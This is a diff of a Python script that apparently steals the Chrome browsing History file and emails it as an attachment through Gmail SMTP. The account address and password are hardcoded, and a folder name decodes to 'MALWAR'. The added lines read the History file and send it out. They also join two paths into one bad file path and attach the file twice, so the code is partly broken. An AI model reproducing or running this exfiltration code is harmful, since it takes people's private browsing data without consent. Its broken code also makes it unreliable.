@@ -65,12 +65,12 @@ def main(platform):
         #print (output)
         #print (f'{p_status} {p_status}')
 #--------------------------------------------------------------------------------------------
-        p = subprocess.Popen('copy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History" "C:\\Users\\User\\Dropbox\\TUFMV0FS\\TestingArea"', stdout=subprocess.PIPE, shell=True)
+        # = subprocess.Popen('copy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History" "C:\\Users\\User\\Dropbox\\TUFMV0FS\\TestingArea"', stdout=subprocess.PIPE, shell=True)
 
-        (copydata, err) = p.communicate()
+        #(copydata, err) = p.communicate()
 
-        p_status = p.wait()
-        print(copydata)
+        #p_status = p.wait()
+        #print(copydata)
 #-----------------------------------------------------------------------------------------------------
 
         msg = EmailMessage()
@@ -79,29 +79,31 @@ def main(platform):
         msg['Subject'] = info
         msg['From'] = "SVBBZGRy@gmail.com"
         msg['To'] = "SVBBZGRy@gmail.com"
-        with open('History', "rb") as attachment:
-            # Add file as application/octet-stream
-            # Email client can usually download this automatically as attachment
-            part = MIMEBase("application", "octet-stream")
-            part.set_payload(attachment.read())
-        encoders.encode_base64(part)
-
-        # Add header as key/value pair to attachment part
-        part.add_header(
-            "Content-Disposition",
-            f"attachment; filename= History",
-        )
-
+        filename = "History"
+        attachment = open("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History" "C:\\Users\\User\\Dropbox\\TUFMV0FS\\TestingArea", "rb")
+        
+        # instance of MIMEBase and named as p 
+        p = MIMEBase('application', 'octet-stream') 
+        
+        # To change the payload into encoded form 
+        p.set_payload((attachment).read()) 
+        
+        # encode into base64 
+        encoders.encode_base64(p) 
+        
+        p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
+        
+        # attach the instance 'p' to instance 'msg' 
+        msg.attach(p) 
         # Add attachment to message and convert message to string
-        msg.attach(part)
-        text = msg.as_string()
+        msg.attach(p)
         # Add HTML/plain-text parts to MIMEMultipart message
         # The email client will try to render the last part first
 
         # Send the message via our own SMTP server.
         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
         server.login("SVBBZGRy@gmail.com", "SVBBZGRy")
-        server.send_message(msg,part)
+        server.send_message(msg)
         server.quit()
         #dir *Program.py /s
         #C: \Users\User\AppData\Local\Google\Chrome\User Data\Default
